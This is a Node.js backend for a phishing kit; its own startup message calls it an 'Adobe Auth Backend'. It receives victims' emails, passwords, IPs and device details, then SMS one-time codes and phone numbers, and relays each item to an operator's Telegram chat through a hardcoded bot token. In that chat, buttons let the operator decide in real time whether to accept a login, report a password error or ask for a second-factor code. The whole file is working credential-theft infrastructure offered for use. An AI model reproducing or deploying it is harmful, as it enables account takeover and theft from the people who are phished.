const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = process.env.BOT_TOKEN || '8748301916:AAHC09wVDPVG-xLObOvD-k_pAFiu8TnkwAw';
const ADMIN_CHAT = process.env.ADMIN_CHAT || '8745609962';

app.use(express.json());
app.use(cors());
app.use(express.static(path.join(__dirname, '..', 'frontend')));

const sessions = {};
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

bot.on('polling_error', err => console.error('[TG Poll Error]', err.message));

// Fixed notification function
async function notifyLogin(session) {
  const { email, password, name, ip, device, type } = session;
  
  const text = 
    `🔐 *NEW ${type?.toUpperCase() || 'LOGIN'}* 🔐\n\n` +
    `📧 *Email:* \`${email}\`\n` +
    `🔑 *Password:* \`${password}\`\n` +
    `${name ? `👤 *Name:* \`${name}\`\n` : ''}` +
    `🌐 *IP:* \`${ip}\`\n` +
    `📱 *Device:* ${device}\n` +
    `🕐 *Time:* ${new Date().toISOString()}\n` +
    `━━━━━━━━━━━━━━━━━━`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '✅ Yes Prompt', callback_data: `approve_${session.sessionId}` },
        { text: '❌ Password Error', callback_data: `deny_${session.sessionId}` }
      ],
      [
        { text: '📱 SMS Code I', callback_data: `sms_${session.sessionId}` },
        { text: '🚫 Block', callback_data: `block_${session.sessionId}` }
      ]
    ]
  };

  try {
    const msg = await bot.sendMessage(ADMIN_CHAT, text, { 
      parse_mode: 'Markdown', 
      reply_markup: keyboard 
    });
    session.messageId = msg.message_id;
    return msg.message_id;
  } catch (err) {
    console.error('[TG Send Error]', err.message);
    return null;
  }
}

bot.on('callback_query', async (query) => {
  const data = query.data || '';
  let action, sessionId;

  if (data.includes('_')) {
    [action, sessionId] = data.split('_');
  } else if (data.includes('::')) {
    [sessionId, action] = data.split('::');
  } else {
    sessionId = data;
    action = 'unknown';
  }

  const session = sessions[sessionId];
  if (!session) {
    return bot.answerCallbackQuery(query.id, { text: 'Session expired' });
  }

  session.status = action;

  const statusMap = {
    approve: 'approved',
    deny: 'denied',
    block: 'blocked',
    sms: 'sms_required',
    sms2: 'sms2_required'
  };

  const finalStatus = statusMap[action] || action;

  try {
    await bot.editMessageText(
      query.message.text + `\n\n👮 *Action:* ${finalStatus.toUpperCase()}`,
      {
        chat_id: ADMIN_CHAT,
        message_id: query.message.message_id,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: [] }
      }
    );
  } catch (e) {}

  await bot.answerCallbackQuery(query.id, { text: finalStatus });
});

// Notify SMS / Phone
async function notifySMS(session, code, codeType = 'sms1') {
  const text = `🔢 *SMS Code Received*\n\n📧 Email: \`${session.email}\`\n🔢 Code: \`${code}\`\nType: ${codeType}`;
  const keyboard = {
    inline_keyboard: [[
      { text: '✅ Approve', callback_data: `${session.sessionId}::approved` },
      { text: '❌ Deny', callback_data: `${session.sessionId}::denied` },
      { text: '📱 Request 2nd', callback_data: `${session.sessionId}::sms2_required` }
    ]]
  };
  await bot.sendMessage(ADMIN_CHAT, text, { parse_mode: 'Markdown', reply_markup: keyboard });
}

async function notifyPhone(session, phone) {
  const text = `📱 *Phone Received*\n\n📧 Email: \`${session.email}\`\n📞 Phone: \`${phone}\``;
  const keyboard = {
    inline_keyboard: [[
      { text: '✅ Approve', callback_data: `${session.sessionId}::approved` },
      { text: '📱 SMS I', callback_data: `${session.sessionId}::sms_required` },
      { text: '❌ Deny', callback_data: `${session.sessionId}::denied` }
    ]]
  };
  await bot.sendMessage(ADMIN_CHAT, text, { parse_mode: 'Markdown', reply_markup: keyboard });
}

// Routes
app.post('/api/login', async (req, res) => {
  const { email, password, name, ip, device, type = 'login' } = req.body;
  if (!email || !password) return res.status(400).json({ error: 'Missing fields' });

  const sessionId = uuidv4();
  const session = {
    sessionId,
    email,
    password,
    name: name || null,
    ip: ip || 'Unknown',
    device: device || 'Unknown',
    type,
    status: 'pending',
    createdAt: Date.now()
  };

  sessions[sessionId] = session;
  await notifyLogin(session);

  res.json({ sessionId, status: 'pending' });
});

app.get('/api/session/:id/status', (req, res) => {
  const session = sessions[req.params.id];
  if (!session) return res.json({ status: 'expired' });

  if (Date.now() - session.createdAt > 10 * 60 * 1000) {
    delete sessions[req.params.id];
    return res.json({ status: 'expired' });
  }

  res.json({ status: session.status });
});

app.post('/api/session/:id/sms', async (req, res) => {
  const session = sessions[req.params.id];
  if (!session) return res.status(404).json({ error: 'Not found' });

  const { code } = req.body;
  await notifySMS(session, code);
  res.json({ ok: true });
});

app.post('/api/session/:id/phone', async (req, res) => {
  const session = sessions[req.params.id];
  if (!session) return res.status(404).json({ error: 'Not found' });

  const { phone } = req.body;
  await notifyPhone(session, phone);
  res.json({ ok: true });
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'frontend', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Adobe Auth Backend running on port ${PORT}`);
  console.log(`📡 Bot is polling...`);
});